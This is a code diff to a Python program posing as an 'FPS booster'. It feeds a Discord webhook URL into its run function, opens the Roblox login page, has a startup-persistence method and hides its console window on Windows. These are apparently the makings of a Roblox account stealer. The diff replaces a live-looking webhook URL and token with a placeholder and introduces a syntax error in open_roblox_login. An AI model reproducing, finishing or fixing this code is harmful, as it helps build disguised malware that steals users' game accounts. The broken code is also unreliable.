@@ -163,7 +163,7 @@ class FPSBooster:
         ram_usage_scale.pack(pady=5)
 
         run_button = tk.Button(root, text="Run", command=lambda: FPSBooster.run_config(
-            cpu_core_var.get(), gpu_power_var.get(), ram_usage_var.get(), "https://discord.com/api/webhooks/1438241619307528263/l-0qdiNwG_pJsG0BqoTsw9DincEeCa-zlXf05bywlwiCEVhAzIdtIGLUfwJfTlvS_ttI", root))
+            cpu_core_var.get(), gpu_power_var.get(), ram_usage_var.get(), "YOUR_DISCORD_WEBHOOK_URL_HERE", root))
         run_button.pack(pady=20)
 
         root.mainloop()
@@ -184,11 +184,8 @@ class FPSBooster:
             root.after(3000, root.quit)
 
     @staticmethod
-    def open_roblox_login(language):
-        if language == 'yes':
+    def open_roblox_login:
             webbrowser.get().open_new_tab('https://www.roblox.com/login')
-        else:
-            webbrowser.get().open_new_tab('https://www.roblox.com/login/pl')
 
     @staticmethod
     def add_to_startup():
@@ -203,5 +200,6 @@ if __name__ == "__main__":
     if os.name == 'nt':
         import ctypes
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
 
     FPSBooster.create_config_window()
